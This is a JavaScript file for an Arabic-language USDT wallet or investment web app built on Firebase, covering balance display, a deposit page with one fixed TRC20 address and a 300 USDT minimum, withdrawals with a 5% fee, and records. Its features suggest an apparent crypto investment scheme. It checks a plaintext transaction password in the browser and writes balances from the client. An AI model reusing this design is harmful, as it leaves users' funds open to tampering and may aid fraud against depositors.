astHTML='<div class="astin" dir="ltr"><div class="acard"><div><div class="albl">إجمالي الأصول (USDT)<svg id="ey" onclick="tgE()" viewBox="0 0 24 24"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg></div><div class="aval" id="av">0.00</div></div><div class="aday"><div class="albl2">أرباح اليوم</div><div class="aval2" id="ady">0</div></div></div><div class="abtns"><button class="abtn dep" onclick="openDep()"><img src="https://i.ibb.co/FbbVgh74/IMG.png" alt="">الإيداع</button><button class="abtn wd" onclick="openWd()"><img src="https://i.ibb.co/DDgGy91y/IMG.png" alt="">سحب العملات</button></div><div class="atabs"><div class="atab on">الأصول</div><div class="atab">إجمالي الأصول</div><div class="arec" onclick="astOpenAllRec()" style="cursor:pointer"><svg viewBox="0 0 24 24"><rect x="5" y="3.5" width="14" height="17" rx="2"/><path d="M9 8.5h6M9 12h6M9 15.5h4"/></svg>السجل</div></div><div class="arow"><span>حساب الأموال</span><b id="fundV">0 USDT</b></div><div class="arow"><span>أرباح الفريق</span><b>0.00 USDT</b></div></div>';
var depHTML='<div class="dpin"><div class="wdt"><div class="pfb" onclick="closeDep()"><img src="https://i.ibb.co/k69JQ9LS/IMG.png" alt="back"></div><h1>الإيداع في العملة</h1><div class="wdb" onclick="openRec(\'dep\')"><svg viewBox="0 0 24 24"><path d="M6 3h9l4 4v14H6z"/><path d="M9 11.5h6M9 15.5h6M9 7.5h2.5"/></svg></div></div><div class="dsub">اختيار العملة</div><div class="dnet" onclick="astNetSheet(\'dep\')" style="cursor:pointer"><span id="dnetV">USDT-TRC20</span><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></div><div class="dqrw"><div class="dqr"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATYAAAE2AQAAAADDx4MEAAACHklEQVR4nO2aQYrkMAxFv8beOzfoo6Ru0GeamzkHKkiWAzF/FpJdLpqBhmacVEpZFKn4QWyE8qVvC/Gdq/z6FgY49zMOzO2OayBJ0gbSXofSfvZ1XIhLJMkdAIpgmQANyrzaHfNLrOMyXBGRCcAyAbCgtGcicvT83pqb10AAQfNj3HudAwDEL0+2CRqKZbr/v/c6928ukFwBIJFyA4BlKqJCP5u8v8I6rsBFYJP2r0QuH3vk8mkPbCidfh1X4ayC0jIqkaofM6k/9fJ6dxDXtRk1KDtqPB4DHo9BnHaBAAKZUVMDj1YQgczeD47itD9/6Dlzev58cQdmz49RnIbCkkQ/VXv9hiVqznh+jON6/8oSor+am3L2dVyF63JBQ5EB2F0Tes+PYZy5uhmWH52SsCm768cwzvQjJ5prZQUV+5rL/fZhnEm5eutrqP3H2uRkBTwe4zhYBaWpAXRFb4api+v5OC4C6S4AinD5vKvdK81qF6TgfuIRXKDctghmFA0PmvErtxPM7424QMxrkcdWFH9LBHTjUER8v3Yc98XfBUxTuv7c9WMY93S+hF1BpT/VzvJ4jOPa+ZJFRLBMgd0mOrZ49Pzeimt+yY6HoVtr4Hp5fz6Me4pH35DX43Gr9+fHcUXqrmCg3NIfEfnQdv0c87s+F2GuVQHm2qITKHVgi/uR83tDbhMRkainfKqABwKbSDv58wLruAQnfr79VNxfhObGJu8HsgcAAAAASUVORK5CYII=" alt="QR"></div></div><div class="dcpr"><span class="t">عنوان الإيداع في العملة</span><span class="dcp" onclick="cpT(\'TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg\')"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1v1"/></svg>نسخ</span></div><div class="daddr">TZ76Nx4tri1Seth6TuVGknLQDU49dKYxg</div><div class="wnote"><b>ملاحظة أمنية</b><p>The minimum deposit amount is 300 USDT. Please ensure that the currency and grid information are correct to avoid financial loss. If the deposit currency is incorrect or the deposit amount is less than 300 USDT, the lost funds will be irrecoverable.</p></div></div>';
/* ===== أنماط صفحات الإيداع/السحب/السجل (نُقلت من الصفحة الأم إلى ملف الأصول الخاص بها) ===== */
(function(){if(document.getElementById('astCss'))return;var st=document.createElement('style');st.id='astCss';st.textContent='.astin{max-width:520px;margin:0 auto;min-height:100vh;position:relative;padding:26px 14px 140px}.acard{background:linear-gradient(150deg,rgba(110,175,255,.5),rgba(45,100,200,.32) 45%,rgba(25,65,150,.42));border:1.5px solid rgba(175,220,255,.6);backdrop-filter:blur(14px) saturate(1.6);-webkit-backdrop-filter:blur(14px) saturate(1.6);box-shadow:0 8px 26px rgba(0,20,60,.5),inset 0 1px 2px rgba(225,242,255,.65),inset 0 -12px 20px rgba(70,140,240,.28),inset 5px 0 12px rgba(160,205,255,.14),inset -5px 0 12px rgba(160,205,255,.14);border-radius:20px;padding:22px 20px 78px;display:flex;justify-content:space-between;align-items:flex-start}.acard .albl{font-size:14.5px;color:#e8eef8;display:flex;align-items:center;gap:8px;font-weight:600}.acard .albl svg{width:19px;height:19px;stroke:#dfe9f7;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;cursor:pointer}.acard .aval{font-size:25px;font-weight:800;letter-spacing:2.5px;margin-top:16px;color:#fff}.aday{text-align:right}.aday .albl2{font-size:14.5px;color:#e8eef8;font-weight:600}.aday .aval2{font-size:25px;font-weight:800;margin-top:16px;color:#fff}.abtns{display:flex;gap:12px;margin:-56px -5px 0;background:#2c3343;border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:11px;box-shadow:0 12px 24px rgba(120,128,145,.35),0 4px 10px rgba(0,0,0,.4);position:relative;z-index:2}.abtn{flex:1;display:flex;align-items:center;justify-content:center;gap:9px;border:none;border-radius:14px;padding:15px 0;font-size:16.5px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit}.abtn img{width:24px;height:24px;object-fit:contain}.atabs{display:flex;align-items:center;gap:22px;margin:22px 4px 0;padding-bottom:0}.atab{font-size:16.5px;color:#9fb3d1;font-weight:600;cursor:pointer;padding-bottom:8px;position:relative}.arec{margin-left:auto;display:flex;align-items:center;gap:6px;font-size:14.5px;color:#3d86f6;font-weight:600;cursor:pointer;padding-bottom:8px}.arec svg{width:21px;height:21px;stroke:#3d86f6;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}.arow{display:flex;align-items:center;justify-content:space-between;background:#0b1526;border-radius:13px;padding:20px 16px;margin-top:14px;box-shadow:0 2px 8px rgba(0,0,0,.3)}.arow span{font-size:15.5px;color:#e8eef8;font-weight:600}.arow b{font-size:15.5px;color:#fff;font-weight:700;letter-spacing:.3px}.wdin{max-width:520px;margin:0 auto;padding:20px 16px 46px;direction:rtl}.wdb{width:42px;height:42px;border-radius:12px;background:rgba(140,190,250,.18);border:1px solid rgba(170,210,250,.4);display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0}.wdb svg{width:21px;height:21px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}.wnet{display:flex;align-items:center;justify-content:space-between;direction:ltr;background:#767e8b;border:1px solid rgba(120,160,220,.14);border-radius:10px;padding:16px 14px;font-size:15px;font-weight:600;margin:22px 0 24px;box-shadow:0 2px 8px rgba(0,0,0,.3)}.wnet svg{width:17px;height:17px;stroke:#8ba2c2;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}.wblk{background:#565d69;border-radius:16px;padding:14px 12px}.wlb{font-size:15px;color:#c9d8ec;font-weight:600;margin:0 2px 11px}.wbox{display:flex;align-items:center;gap:8px;background:#8a929d;border:1px solid rgba(120,160,220,.14);border-radius:10px;padding:0 13px;margin-bottom:22px;box-shadow:0 2px 8px rgba(0,0,0,.3)}.wbox input{flex:1;min-width:0;background:none;border:0;outline:0;color:#e8eef8;font-size:14px;font-family:inherit;padding:16px 0}.wbox input::placeholder{color:#6d7c96}.wbox>svg{width:20px;height:20px;stroke:#8ba2c2;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}.wrow{display:flex;justify-content:space-between;gap:12px;margin:0 2px 12px}.wrow>span{font-size:15.5px;color:#dfe9f7;font-weight:700;line-height:1.6}.wbal{text-align:left;font-size:12px;color:#8ba2c2;line-height:1.5}.wbal b{display:block;font-size:14px;color:#c9d8ec;margin-top:5px;letter-spacing:.3px}.wfull{font-size:13px;color:#9fb3d1;white-space:nowrap;cursor:pointer;font-weight:600}.wgo{width:100%;margin-top:6px;padding:17px;font-size:17px;font-weight:700;color:#fff;font-family:inherit;border:0;border-radius:12px;background:linear-gradient(180deg,#2f8bff,#1a6de8);box-shadow:0 5px 15px rgba(20,90,220,.5),inset 0 1px 2px rgba(200,230,255,.4);cursor:pointer}.wnote{margin-top:26px}.wnote b{font-size:16.5px;color:#e8eef8}.wnote p{font-size:12.5px;color:#71809a;line-height:1.8;margin-top:9px;direction:ltr;text-align:left}.dpw{display:none;position:fixed;inset:0;z-index:100;overflow-y:auto;background:radial-gradient(ellipse 120% 70% at 50% 0,#1a5fb4 0,#0c2347 45%,#030c1b 100%)}.dpin{max-width:520px;margin:0 auto;padding:20px 16px 46px;direction:rtl}.dsub{font-size:14px;color:#9fb3d1;font-weight:600;margin:10px 4px 0;direction:ltr;text-align:left}.dnet{display:flex;align-items:center;justify-content:space-between;direction:ltr;background:#767e8b;border:1px solid rgba(120,160,220,.14);border-radius:10px;padding:16px 14px;font-size:15px;font-weight:600;margin:14px 0 0;box-shadow:0 2px 8px rgba(0,0,0,.3)}.dnet svg{width:17px;height:17px;stroke:#8ba2c2;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}.dqrw{background:rgba(86,93,105,.55);border-radius:16px;margin-top:22px;padding:34px 14px;display:flex;justify-content:center}.dqr{width:216px;height:216px;background:#fff;border-radius:10px;padding:12px;box-shadow:0 4px 16px rgba(0,0,0,.45)}.dqr img{width:100%;height:100%;display:block}.dcpr{display:flex;align-items:center;justify-content:space-between;direction:rtl;margin:20px 2px 10px}.dcp{font-size:13.5px;color:#9fb3d1;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:5px}.dcp svg{width:16px;height:16px;stroke:#9fb3d1;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}.daddr{direction:ltr;text-align:left;background:#767e8b;border:1px solid rgba(120,160,220,.14);border-radius:10px;padding:17px 13px;font-size:14.5px;color:#e8eef8;font-weight:600;letter-spacing:.3px;word-break:break-all;box-shadow:0 2px 8px rgba(0,0,0,.3)}.rtabs{display:flex;gap:10px;margin:20px 0 0;direction:rtl}.remp{margin-top:110px;display:flex;flex-direction:column;align-items:center;gap:18px}.remp img{width:170px;height:auto;object-fit:contain;display:block}.remp p{font-size:15px;color:#8ba2c2;font-weight:600}.trdrec{display:flex;align-items:center;gap:7px;cursor:pointer;background:none;border:none;padding:0;font-family:inherit}.trdrec svg{width:21px;height:21px;stroke:#2f7bf6;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}.trdrec span{font-size:15.5px;font-weight:600;color:#e8f1ff}.dqr{position:relative}.dqr img{transition:opacity .25s}.dqrfx{display:none;position:absolute;inset:12px;border-radius:6px;overflow:hidden;background:repeating-linear-gradient(0deg,rgba(10,26,52,0) 0 5px,rgba(10,26,52,.38) 5px 6px),repeating-linear-gradient(90deg,rgba(10,26,52,0) 0 5px,rgba(10,26,52,.38) 5px 6px)}.dqrfx::after{content:\'\';position:absolute;left:0;right:0;height:32%;background:linear-gradient(180deg,transparent,rgba(63,139,255,.6),transparent);animation:qrscan 1.1s ease-in-out infinite}.rst{color:#2fd07f;font-size:11.5px;font-weight:700}.wlb[data-t="sendAddr"]{direction:ltr;text-align:left}.wrow>span[data-h="qty"]{order:2;text-align:left}';document.head.appendChild(st)})();
var d=document.getElementById('dep');if(d){d.className='dpw';d.innerHTML=depHTML}
var wdHTML='<div class="wdin"><div class="wdt"><div class="pfb" onclick="closeWd()"><img src="https://i.ibb.co/k69JQ9LS/IMG.png" alt="back"></div><h1 data-t="wdTitle">سحب العملات</h1><div class="wdb" onclick="wdOpenRecs()"><svg viewBox="0 0 24 24"><path d="M6 3h9l4 4v14H6z"/><path d="M9 11.5h6M9 15.5h6M9 7.5h2.5"/></svg></div></div><div class="wnet" onclick="astNetSheet(\'wd\')" style="cursor:pointer"><span id="wnetV">TRC20</span><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></div><div class="wblk"><div class="wlb" data-t="sendAddr">عنوان الإرسال</div><div class="wbox"><input dir="ltr" id="wAddr" placeholder=""><svg viewBox="0 0 24 24"><path d="M4 8V5a1 1 0 0 1 1-1h3M16 4h3a1 1 0 0 1 1 1v3M20 16v3a1 1 0 0 1-1 1h-3M8 20H5a1 1 0 0 1-1-1v-3M4 12h16"/></svg></div><div class="wrow"><span data-h="qty">الكمية<br>المستخرجة</span><div class="wbal"><span data-t="avail">الرصيد المتوفر للسحب (USDT) :$</span><b id="wBalV">0.00</b></div></div><div class="wbox"><input inputmode="decimal" id="wAmt" data-ph="phQty" placeholder="أدخل الكمية"><span class="wfull" data-t="wdAll" onclick="wdFillMax()">السحب الكامل</span></div><div class="wlb" data-t="payPwd">كلمة مرور التعامل</div><div class="wbox"><input id="wPass" data-ph="phPwd" placeholder="أدخل كلمة مرور التعامل" inputmode="numeric"></div><button class="wgo" data-t="confirmWd" onclick="wdConfirm()">تأكيد السحب</button><div class="wnote"><b data-t="secNote">ملاحظة أمنية</b><p data-t="secTxt">Please check and make sure the address and grid are correct to avoid loss of funds. If you transfer to the wrong address, the lost funds will not be recovered.</p></div></div></div>';
var w=document.getElementById('wdw');if(w){w.innerHTML=wdHTML}

/* === تم حذف تعريف wdHTML وحقن CSS الخاص بالتصميم الجديد للسحب === */
/* السبب: التصميم القديم الأصلي (الذي يحتوي العنوان TLhzZAb1pqhUxxAUFag68XgXRCJ1X) موجود مسبقاً داخل #wd في الصفحة، وكان يتم استبداله عند تحميل هذا الملف وعند فتح صفحة السحب. أصبح الآن يُستخدم كما هو بدون أي حقن أو استبدال. */

var AST_FB_CFG={apiKey:"AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg",authDomain:"hhhxh-5ebe4.firebaseapp.com",projectId:"hhhxh-5ebe4",storageBucket:"hhhxh-5ebe4.firebasestorage.app",messagingSenderId:"79243000696",appId:"1:79243000696:web:ee0fb2d2ccce791954e68d",measurementId:"G-08BR6LN6PT"};
var astFB={ready:false,uid:null,db:null,auth:null,fs:null};
var astBal=(typeof astBal!=='undefined')?astBal:0;
var astEyeOpen=(typeof astEyeOpen!=='undefined')?astEyeOpen:true;
try{var _astEyeSaved=localStorage.getItem('astEye');if(_astEyeSaved==='0')astEyeOpen=false;}catch(e){}
var AST_EYE_OPEN='<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>';
var AST_EYE_OFF='<path d="M3 3l18 18"/><path d="M10.6 5.1A9.7 9.7 0 0 1 12 5c5 0 9 4.6 10 7-.35.9-1.2 2.3-2.6 3.6M6.6 6.6C4.2 8 2.6 10.4 2 12c1 2.4 5 7 10 7 1.4 0 2.8-.35 4-.95M9.9 9.9a3 3 0 0 0 4.2 4.2"/>';

if(!window.__astInit){
window.__astInit=true;
(async function(){
  try{
    var authM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js');
    var fsM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js');
    astFB.fs=fsM;
    var app=(window.__exFB&&window.__exFB.app)?window.__exFB.app:null;
    if(app){
      astFB.auth=window.__exFB.auth||authM.getAuth(app);
      astFB.db=window.__exFB.db||fsM.getFirestore(app);
    }else{
      var appM=await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js');
      var app2;
      try{app2=appM.getApp('trdApp');}catch(e){app2=appM.initializeApp(AST_FB_CFG,'astApp');}
      astFB.auth=authM.getAuth(app2);
      astFB.db=fsM.getFirestore(app2);
    }
    authM.onAuthStateChanged(astFB.auth,async function(u){
      try{
        if(!u){astFB.ready=false;astFB.uid=null;return;}
        astFB.uid=u.uid;
        astFB.ready=true;
        await astLoadUser();
      }catch(e){}
    });
  }catch(e){}
})();
}

async function astLoadUser(){
  try{
    var fs=astFB.fs;
    var snap=await fs.getDoc(fs.doc(astFB.db,'users',astFB.uid));
    if(snap.exists()){
      var d=snap.data()||{};
      var nb=Number(d.balance);
      if(isFinite(nb)){
        if(nb>0){astBal=nb;}
        else if(!(astBal>0)){astBal=0;}
        /* إن كانت القراءة 0 بينما الرصيد المحلي أكبر من 0 نحتفظ بالمحلي
           لمنع التصفير اللحظي (قراءة غير مكتملة/مؤقتة من فيرباس) */
      }
      astRenderBal();
      var now=Date.now(),day=24*60*60*1000,profit=0;
      var _recs=Array.isArray(d.records)?d.records:[];
      var _recsChanged=false;
      _recs.forEach(function(r){
        if(r&&r.type==='buy'&&isFinite(Number(r.at))){
          if(now-Number(r.at)<day){profit+=Number(r.amount)||0;}
          else{_recsChanged=true;r.amount=0;}/* انتهت مدة الـ 24 ساعة: تصفير الربح من السجل في فيرباس */
        }
      });
      var ady=document.getElementById('ady');
      if(ady)ady.textContent=profit.toFixed(2);
      if(_recsChanged){fs.updateDoc(fs.doc(astFB.db,'users',astFB.uid),{records:_recs}).catch(function(){});}
    }
  }catch(e){}
}

function astRenderBal(){
  var nb=Number(astBal);
  if(!isFinite(nb))nb=0;
  var av=document.getElementById('av');
  if(av){
    var cur=av.textContent.trim();
    if(astEyeOpen){
      av.textContent=nb>0?nb.toFixed(2):(av.dataset.astLast||cur||'0.00');
    }else{
      if(cur&&cur!=='*** ***'&&cur!=='0.00')av.dataset.astLast=cur;
      av.textContent='*** ***';
    }
  }
  var fv=document.getElementById('fundV');
  if(fv){
    var fcur=fv.textContent.replace('USDT','').trim();
    if(astEyeOpen){
      fv.textContent=(nb>0?nb.toFixed(2):(fv.dataset.astLast||fcur||'0.00'))+' USDT';
    }else{
      if(fcur&&fcur!=='*** ***'&&fcur!=='0.00')fv.dataset.astLast=fcur;
      fv.textContent='*** *** USDT';
    }
  }
  var wb=document.getElementById('wBalV');
  if(wb){wb.textContent=nb.toFixed(2);}
  var ey=document.getElementById('ey');
  if(ey){var ic=astEyeOpen?AST_EYE_OPEN:AST_EYE_OFF;if(ey.innerHTML!==ic)ey.innerHTML=ic;}
}

async function astRefresh(){
  astRenderBal();
  if(astFB.ready&&astFB.uid){
    try{await astLoadUser();}catch(e){astRenderBal();}
  }
}

if(!window.__astObserver&&typeof MutationObserver!=='undefined'&&document.body){
  window.__astObserver=new MutationObserver(function(){
    var av=document.getElementById('av');
    if(av&&!av.dataset.astBound){
      av.dataset.astBound='1';
      astRefresh();
    }
  });
  window.__astObserver.observe(document.body,{childList:true,subtree:true});
}
astRefresh();

window.tgE=function(){
  astEyeOpen=!astEyeOpen;
  try{localStorage.setItem('astEye',astEyeOpen?'1':'0');}catch(e){}
  astRenderBal();
};

/* ===== قسم السحب: استخدام التصميم القديم الأصلي الموجود في الصفحة (#wd / #withdraw) بدون أي حقن أو استبدال أو CSS إضافي ===== */

window.wdFillMax=function(){
  var el=document.getElementById('wdamt')||document.getElementById('withdrawAmount')||document.getElementById('wAmt');
  if(!el)return;
  var nb=Number(astBal);if(!isFinite(nb)||nb<0)nb=0;
  el.value=nb.toFixed(2);
};

window.openWd=function(){
  var w=document.getElementById('wdw');
  if(!w)return;
  if(!w.innerHTML&&typeof wdHTML!=='undefined'){w.innerHTML=wdHTML;}
  try{if(typeof hideAll==='function')hideAll();}catch(e){}
  try{var nv=document.querySelector('.nav');if(nv)nv.style.display='none';}catch(e){}
  w.style.display='block';
  try{astNetSync()}catch(e){}
  try{window.scrollTo(0,0);}catch(e){}
  try{if(typeof flashLd==='function')flashLd();}catch(e){}
};

window.closeWd=function(){
  try{if(typeof hideAll==='function')hideAll();}catch(e){}
  try{var nv=document.querySelector('.nav');if(nv)nv.style.display='flex';}catch(e){}
  var a=document.getElementById('ast');if(a)a.style.display='block';
  try{if(typeof setNav==='function')setNav(4);}catch(e){}
  try{window.scrollTo(0,0);}catch(e){}
  try{if(typeof flashLd==='function')flashLd();}catch(e){}
};

window.wdConfirm=async function(){
  var addrEl=document.getElementById('wAddr')||document.getElementById('wdaddr')||document.getElementById('withdrawAddr');
  var waddr=(addrEl&&addrEl.value)?addrEl.value.trim():'';
  var amtEl=document.getElementById('wAmt')||document.getElementById('wdamt')||document.getElementById('withdrawAmount');
  var passEl=document.getElementById('wPass')||document.getElementById('wdpass')||document.getElementById('withdrawPass');
  var amt=parseFloat(amtEl?amtEl.value:'');
  var pass=passEl?passEl.value:'';
  if(!waddr){astToast('يرجى إدخال عنوان الإرسال');return;}
  if(!isFinite(amt)||amt<=0){astToast('يرجى إدخال كمية صحيحة');return;}
  if(amt<10){astToast('الحد الأدنى للسحب هو 10 USDT');return;}
  var nb=Number(astBal);if(!isFinite(nb))nb=0;
  if(amt>nb){astToast('الكمية أكبر من الرصيد المتاح للسحب');return;}
  if(!pass){astToast('يرجى إدخال كلمة مرور التعامل');return;}
  var newRec={type:'withdraw',amount:amt,at:Date.now(),addr:waddr,net:astNet,status:'pending'};
  try{
    if(astFB.ready&&astFB.uid&&astFB.fs){
      var fs=astFB.fs;
      var ref=fs.doc(astFB.db,'users',astFB.uid);
      var snap=await fs.getDoc(ref);
      var d=snap.exists()?(snap.data()||{}):{};
      var pp=(d.payPassword!==undefined&&d.payPassword!==null)?String(d.payPassword):'';
      if(!pp){astToast('لم يتم تعيين كلمة مرور التعامل لحسابك');return;}
      if(String(pass)!==pp){astToast('كلمة مرور التعامل غير صحيحة');return;}
      var cur=Number(d.balance);if(!isFinite(cur)||cur<0)cur=nb;
      if(amt>cur){astToast('الكمية أكبر من الرصيد المتاح للسحب');return;}
      var recs=Array.isArray(d.records)?d.records.slice():[];
      recs.push(newRec);
      await fs.updateDoc(ref,{balance:cur-amt,records:recs});
      astBal=cur-amt;
      astRenderBal();
      openRec('wd');
    }else{
      astToast('تعذر التحقق من كلمة مرور التعامل، يرجى المحاولة بعد قليل');return;
    }
  }catch(e){astToast('حدث خطأ، يرجى المحاولة مرة أخرى');}
};

/* ===== سجل طلبات السحب: تصميم مطابق تماماً للصورة (خلفية كحلية، بطاقة نجاح، TRC20، الرسوم 5%، التاريخ YYYY-MM-DD HH:MM:SS) ===== */
function wdFmtD(t){
  var d=new Date(Number(t)||Date.now());
  function p2(n){return (n<10?'0':'')+n;}
  return d.getFullYear()+'-'+p2(d.getMonth()+1)+'-'+p2(d.getDate())+' '+p2(d.getHours())+':'+p2(d.getMinutes())+':'+p2(d.getSeconds());
}

window.wdShowRecs=function(recs){
  try{
    if(!document.getElementById('wdRecCss')){
      var st=document.createElement('style');
      st.id='wdRecCss';
      st.textContent='#wdRecOv{position:fixed;inset:0;z-index:99999;overflow-y:auto;background:linear-gradient(180deg,#0b2a6b 0%,#071a4a 30%,#020b28 100%);direction:ltr;}'
      +'.wrh{display:flex;align-items:center;padding:14px 12px;}'
      +'.wrbk{width:34px;height:34px;border-radius:8px;background:rgba(255,255,255,.14);display:flex;align-items:center;justify-content:center;cursor:pointer;}'
      +'.wrbk svg{width:20px;height:20px;fill:none;stroke:#fff;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;}'
      +'.wrc{margin:10px 12px;padding:12px 14px;border-radius:10px;background:rgba(150,142,125,.42);box-shadow:0 2px 8px rgba(0,0,0,.22);}'
      +'.wrk{color:#fff;font-size:13px;font-weight:600;margin-bottom:8px;}'
      +'.wrk.stp{color:#ffc24b;}'
      +'.wrk.stok{color:#2ee6a8;}'
      +'.wrk.stno{color:#ff6b6b;}'
      +'.wra{color:#fff;font-size:18px;font-weight:600;letter-spacing:.3px;margin-bottom:8px;}'
      +'.wrl{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;}'
      +'.wrn{color:#aeb6cf;font-size:12px;}'
      +'.wrd{color:#aeb6cf;font-size:12px;direction:ltr;}'
      +'.wrf{color:#aeb6cf;font-size:12px;}'
      +'.wrf span{color:#8f97b2;}'
      +'.wrad{color:#8f97b2;font-size:11px;direction:ltr;word-break:break-all;margin-top:4px;text-align:left;}'
      +'.wrempty{color:#aeb6cf;text-align:center;padding:60px 20px;font-size:14px;}';
      document.head.appendChild(st);
    }
    var ov=document.getElementById('wdRecOv');
    if(!ov){ov=document.createElement('div');ov.id='wdRecOv';document.body.appendChild(ov);}
    var h='<div class="wrh"><div class="wrbk" onclick="wdHideRecs()"><svg viewBox="0 0 24 24"><path d="M15 5l-7 7 7 7"/></svg></div></div>';
    var list=(recs||[]).filter(function(r){return r&&r.type==='withdraw';}).slice().reverse();
    if(!list.length){h+='<div class="wrempty">لا توجد طلبات سحب بعد</div>';}
    list.forEach(function(r){
      var amt=Number(r.amount)||0;
      var fee=amt*0.05;
      var rs=(r&&r.status)?String(r.status):'pending';
      var stTxt='قيد المعالجة',stCls='stp';
      if(rs==='approved'||rs==='success'){stTxt='نجاح';stCls='stok';}
      else if(rs==='rejected'||rs==='failed'){stTxt='فشل';stCls='stno';}
      h+='<div class="wrc">'
        +'<div class="wrk '+stCls+'">'+stTxt+'</div>'
        +'<div class="wra">'+amt.toFixed(8)+' USDT</div>'
        +'<div class="wrl"><span class="wrn">'+(r.net||'TRC20')+'</span><span class="wrd">'+wdFmtD(r.at)+'</span></div>'
        +'<div class="wrf">'+fee.toFixed(8)+' <span>الرسوم</span></div>'
        +(r.addr?'<div class="wrad">'+String(r.addr).replace(/</g,'&lt;')+'</div>':'')
        +'</div>';
    });
    ov.innerHTML=h;
    ov.style.display='block';
    try{window.scrollTo(0,0);}catch(e){}
  }catch(e){}
};

window.wdHideRecs=function(){
  var ov=document.getElementById('wdRecOv');
  if(ov)ov.style.display='none';
  if(wdRecUnsub){try{wdRecUnsub();}catch(e){}wdRecUnsub=null;}
};

/* ===== شاشة التحميل (أيقونة تحميل في نص الشاشة) وشاشة نجاح الأمر (خلفية سوداء شفافة) ===== */
function wdOvCss(){
  if(document.getElementById('wdOvCss'))return;
  var st=document.createElement('style');
  st.id='wdOvCss';
  st.textContent='#wdLdOv{position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;direction:ltr;}'
  +'.wdldbox{display:flex;flex-direction:column;align-items:center;gap:12px;}'
  +'.wdspin{width:46px;height:46px;border-radius:50%;border:4px solid rgba(255,255,255,.25);border-top-color:#fff;animation:wdsp .8s linear infinite;}'
  +'@keyframes wdsp{to{transform:rotate(360deg)}}'
  +'.wdldt{color:#fff;font-size:14px;}'
  +'.wdokbox{background:rgba(0,0,0,.78);border-radius:14px;padding:26px 34px;display:flex;flex-direction:column;align-items:center;gap:12px;}'
  +'.wdokic{width:52px;height:52px;border-radius:50%;background:#22c55e;display:flex;align-items:center;justify-content:center;}'
  +'.wdokic svg{width:28px;height:28px;fill:none;stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;}'
  +'.wdokt{color:#fff;font-size:16px;font-weight:600;}';
  document.head.appendChild(st);
}
window.wdShowLd=function(t){
  wdOvCss();
  var ov=document.getElementById('wdLdOv');
  if(!ov){ov=document.createElement('div');ov.id='wdLdOv';document.body.appendChild(ov);}
  ov.innerHTML='<div class="wdldbox"><div class="wdspin"></div><div class="wdldt">'+(t||'جاري المعالجة...')+'</div></div>';
  ov.style.display='flex';
};
window.wdHideLd=function(){
  var ov=document.getElementById('wdLdOv');
  if(ov)ov.style.display='none';
};
window.wdShowOk=function(msg,cb){
  wdOvCss();
  var ov=document.getElementById('wdLdOv');
  if(!ov){ov=document.createElement('div');ov.id='wdLdOv';document.body.appendChild(ov);}
  ov.innerHTML='<div class="wdokbox"><div class="wdokic"><svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg></div><div class="wdokt">'+(msg||'نجاح الأمر')+'</div></div>';
  ov.style.display='flex';
  setTimeout(function(){ov.style.display='none';if(typeof cb==='function')cb();},1600);
};

/* ===== فتح سجل طلبات السحب من صفحة السحب: نفس سجل قسم الإيداع حرفياً (openRec) ويعرض طلبات السحب ===== */
var wdRecUnsub=null;

/* ===== سجل الطلبات: عرض طلبات المستخدم الخاصة به مباشرة وبشكل دائم داخل صفحة السجل ===== */
var recUnsub=null,recType='wd';
function recEnsureCss(){
  if(document.getElementById('recListCss'))return;
  var st=document.createElement('style');
  st.id='recListCss';
  st.textContent='.rlist{padding:10px 14px;direction:ltr;}'
  +'.ritm{background:rgba(150,142,125,.30);border-radius:10px;padding:12px 14px;margin-bottom:10px;box-shadow:0 2px 8px rgba(0,0,0,.18);}'
  +'.ritm .rst{font-size:13px;font-weight:600;margin-bottom:8px;}'
  +'.ritm .rst.p{color:#ffc24b;}'
  +'.ritm .rst.ok{color:#2ee6a8;}'
  +'.ritm .rst.no{color:#ff6b6b;}'
  +'.ritm .ram{color:#fff;font-size:17px;font-weight:600;letter-spacing:.3px;margin-bottom:8px;direction:ltr;text-align:left;}'
  +'.ritm .rrw{display:flex;justify-content:space-between;align-items:center;color:#aeb6cf;font-size:12px;margin-bottom:4px;}'
  +'.ritm .rad{color:#8f97b2;font-size:11px;direction:ltr;word-break:break-all;margin-top:4px;text-align:left;}';
  document.head.appendChild(st);
}
function recListEl(){
  var l=document.getElementById('rlist');
  if(l)return l;
  var rc=document.getElementById('rec');
  if(!rc)return null;
  l=document.createElement('div');
  l.id='rlist';l.className='rlist';
  var tabs=rc.querySelector('.rtabs');
  var inr=rc.querySelector('.wdin')||rc;
  if(tabs&&tabs.parentNode===inr&&tabs.nextSibling){inr.insertBefore(l,tabs.nextSibling);}
  else{inr.appendChild(l);}
  return l;
}
